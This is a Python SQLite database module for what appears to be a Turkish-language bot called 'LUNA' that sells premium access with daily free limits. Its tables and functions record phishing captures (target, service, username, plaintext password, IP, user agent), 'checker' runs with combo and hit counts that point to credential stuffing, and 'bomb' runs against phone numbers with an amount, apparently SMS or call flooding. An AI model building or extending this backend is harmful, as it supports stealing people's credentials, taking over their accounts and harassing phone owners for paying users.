# database.py
import sqlite3
import datetime
import secrets
import string
from config import DB_FILE, ADMIN_IDS, FREE_DAILY_QUERY, FREE_DAILY_CHECKER, FREE_DAILY_BOMB


def _conn():
    c = sqlite3.connect(DB_FILE, check_same_thread=False)
    c.row_factory = sqlite3.Row
    return c


def init_db():
    with _conn() as c:
        c.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT, first_name TEXT, last_name TEXT,
            is_premium INTEGER DEFAULT 0, premium_until TEXT,
            banned INTEGER DEFAULT 0, is_admin INTEGER DEFAULT 0,
            join_date TEXT, last_activity TEXT,
            total_queries INTEGER DEFAULT 0,
            total_checks INTEGER DEFAULT 0,
            total_bombs INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS premium_codes (
            code TEXT PRIMARY KEY, plan_type TEXT, days INTEGER,
            created_by INTEGER, created_at TEXT,
            used_by INTEGER, used_at TEXT, is_used INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS query_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER, api_name TEXT, query_text TEXT,
            timestamp TEXT, success INTEGER DEFAULT 1
        );
        CREATE TABLE IF NOT EXISTS checker_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER, checker_name TEXT,
            combo_count INTEGER, hit_count INTEGER, timestamp TEXT
        );
        CREATE TABLE IF NOT EXISTS bomb_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER, phone TEXT, amount INTEGER, timestamp TEXT
        );
        CREATE TABLE IF NOT EXISTS support_tickets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER, otp TEXT, status TEXT DEFAULT 'open',
            created_at TEXT, closed_at TEXT
        );
        CREATE TABLE IF NOT EXISTS support_messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ticket_id INTEGER, sender_id INTEGER,
            is_admin INTEGER DEFAULT 0, text TEXT, timestamp TEXT
        );
        CREATE TABLE IF NOT EXISTS daily_usage (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER, date TEXT,
            query_count INTEGER DEFAULT 0,
            checker_count INTEGER DEFAULT 0,
            bomb_count INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS phish_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER, target_id TEXT,
            service TEXT, username TEXT, password TEXT,
            ip TEXT, user_agent TEXT, timestamp TEXT
        );
        """)
        for aid in ADMIN_IDS:
            c.execute(
                "INSERT OR IGNORE INTO users "
                "(user_id, username, first_name, last_name, is_admin, is_premium, premium_until, join_date) "
                "VALUES (?, 'Admin', 'Yönetici', 'LUNA', 1, 1, '2099-12-31 23:59:59', datetime('now'))",
                (aid,),
            )
        c.commit()


def exec_q(sql, params=()):
    with _conn() as c:
        c.execute(sql, params)
        c.commit()


def fetch(sql, params=(), one=False):
    with _conn() as c:
        cur = c.execute(sql, params)
        return cur.fetchone() if one else cur.fetchall()


def create_user(uid, username, first_name, last_name):
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    exec_q(
        "INSERT OR IGNORE INTO users "
        "(user_id, username, first_name, last_name, join_date, last_activity) "
        "VALUES (?, ?, ?, ?, ?, ?)",
        (uid, username or "", first_name or "", last_name or "", now, now),
    )


def touch_user(uid):
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    exec_q("UPDATE users SET last_activity = ? WHERE user_id = ?", (now, uid))


def get_user(uid):
    return fetch("SELECT * FROM users WHERE user_id = ?", (uid,), one=True)


def is_admin(uid):
    return uid in ADMIN_IDS


def is_banned(uid):
    u = get_user(uid)
    return bool(u and u["banned"] == 1)


def is_premium(uid):
    u = get_user(uid)
    if not u or u["is_premium"] != 1 or not u["premium_until"]:
        return False
    try:
        until = datetime.datetime.strptime(u["premium_until"], "%Y-%m-%d %H:%M:%S")
    except Exception:
        return False
    if until > datetime.datetime.now():
        return True
    exec_q("UPDATE users SET is_premium = 0 WHERE user_id = ?", (uid,))
    return False


def set_premium(uid, days):
    u = get_user(uid)
    now = datetime.datetime.now()
    if u and u["is_premium"] == 1 and u["premium_until"]:
        try:
            ex = datetime.datetime.strptime(u["premium_until"], "%Y-%m-%d %H:%M:%S")
            base = ex if ex > now else now
        except Exception:
            base = now
    else:
        base = now
    until = (base + datetime.timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
    exec_q("UPDATE users SET is_premium = 1, premium_until = ? WHERE user_id = ?", (until, uid))
    return until


def remove_premium(uid):
    exec_q("UPDATE users SET is_premium = 0, premium_until = NULL WHERE user_id = ?", (uid,))


def ban_user(uid):
    exec_q("UPDATE users SET banned = 1 WHERE user_id = ?", (uid,))


def unban_user(uid):
    exec_q("UPDATE users SET banned = 0 WHERE user_id = ?", (uid,))


def gen_code(plan, days, admin_id):
    code = "LUNA-" + "".join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(7))
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    exec_q(
        "INSERT INTO premium_codes (code, plan_type, days, created_by, created_at) "
        "VALUES (?, ?, ?, ?, ?)",
        (code, plan, days, admin_id, now),
    )
    return code


def redeem_code(uid, code):
    c = fetch("SELECT * FROM premium_codes WHERE code = ?", (code,), one=True)
    if not c:
        return False, "❌ Kod bulunamadı."
    if c["is_used"] == 1:
        return False, "❌ Bu kod kullanılmış."
    until = set_premium(uid, c["days"])
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    exec_q("UPDATE premium_codes SET is_used = 1, used_by = ?, used_at = ? WHERE code = ?",
           (uid, now, code))
    return True, f"✅ Premium aktif. Bitiş: <code>{until}</code>"


def log_query(uid, api_name, text, success=True):
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    exec_q("INSERT INTO query_logs (user_id, api_name, query_text, timestamp, success) "
           "VALUES (?, ?, ?, ?, ?)",
           (uid, api_name, text, now, 1 if success else 0))
    exec_q("UPDATE users SET total_queries = total_queries + 1 WHERE user_id = ?", (uid,))


def log_checker(uid, name, combo_count, hit_count):
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    exec_q("INSERT INTO checker_logs (user_id, checker_name, combo_count, hit_count, timestamp) "
           "VALUES (?, ?, ?, ?, ?)",
           (uid, name, combo_count, hit_count, now))
    exec_q("UPDATE users SET total_checks = total_checks + ? WHERE user_id = ?", (combo_count, uid))


def log_bomb(uid, phone, amount):
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    exec_q("INSERT INTO bomb_logs (user_id, phone, amount, timestamp) VALUES (?, ?, ?, ?)",
           (uid, phone, amount, now))
    exec_q("UPDATE users SET total_bombs = total_bombs + 1 WHERE user_id = ?", (uid,))


def create_ticket(uid, otp):
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    exec_q("INSERT INTO support_tickets (user_id, otp, status, created_at) VALUES (?, ?, 'open', ?)",
           (uid, otp, now))
    return fetch("SELECT last_insert_rowid() AS id", one=True)["id"]


def get_open_ticket(uid):
    return fetch("SELECT * FROM support_tickets WHERE user_id = ? AND status = 'open' "
                 "ORDER BY id DESC LIMIT 1", (uid,), one=True)


def add_support_msg(ticket_id, sender_id, is_admin_flag, text):
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    exec_q("INSERT INTO support_messages (ticket_id, sender_id, is_admin, text, timestamp) "
           "VALUES (?, ?, ?, ?, ?)",
           (ticket_id, sender_id, 1 if is_admin_flag else 0, text, now))


def _today():
    return datetime.datetime.now().strftime("%Y-%m-%d")


def get_daily(uid):
    row = fetch("SELECT query_count, checker_count, bomb_count FROM daily_usage "
                "WHERE user_id = ? AND date = ?", (uid, _today()), one=True)
    if not row:
        return {"query": 0, "checker": 0, "bomb": 0}
    return {"query": row["query_count"], "checker": row["checker_count"], "bomb": row["bomb_count"]}


def _ensure_daily(uid):
    if not fetch("SELECT id FROM daily_usage WHERE user_id = ? AND date = ?",
                 (uid, _today()), one=True):
        exec_q("INSERT INTO daily_usage (user_id, date) VALUES (?, ?)", (uid, _today()))


def inc_daily(uid, kind):
    _ensure_daily(uid)
    col = {"query": "query_count", "checker": "checker_count", "bomb": "bomb_count"}[kind]
    exec_q(f"UPDATE daily_usage SET {col} = {col} + 1 WHERE user_id = ? AND date = ?",
           (uid, _today()))


def can_use(uid, kind):
    if is_admin(uid) or is_premium(uid):
        return True, 999
    d = get_daily(uid)
    limit = {"query": FREE_DAILY_QUERY, "checker": FREE_DAILY_CHECKER, "bomb": FREE_DAILY_BOMB}[kind]
    used = d[kind]
    left = limit - used
    return left > 0, max(0, left)


def log_phish(uid, target_id, service, username, password, ip, ua):
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    exec_q("INSERT INTO phish_logs (user_id, target_id, service, username, password, ip, user_agent, timestamp) "
           "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
           (uid, target_id, service, username, password, ip, ua, now))


def get_stats():
    return {
        "users": fetch("SELECT COUNT(*) c FROM users", one=True)["c"],
        "premium": fetch("SELECT COUNT(*) c FROM users WHERE is_premium = 1", one=True)["c"],
        "banned": fetch("SELECT COUNT(*) c FROM users WHERE banned = 1", one=True)["c"],
        "queries": fetch("SELECT COUNT(*) c FROM query_logs", one=True)["c"],
        "checks": fetch("SELECT COUNT(*) c FROM checker_logs", one=True)["c"],
        "bombs": fetch("SELECT COUNT(*) c FROM bomb_logs", one=True)["c"],
        "codes": fetch("SELECT COUNT(*) c FROM premium_codes", one=True)["c"],
        "used_codes": fetch("SELECT COUNT(*) c FROM premium_codes WHERE is_used = 1", one=True)["c"],
        "phish": fetch("SELECT COUNT(*) c FROM phish_logs", one=True)["c"],
    }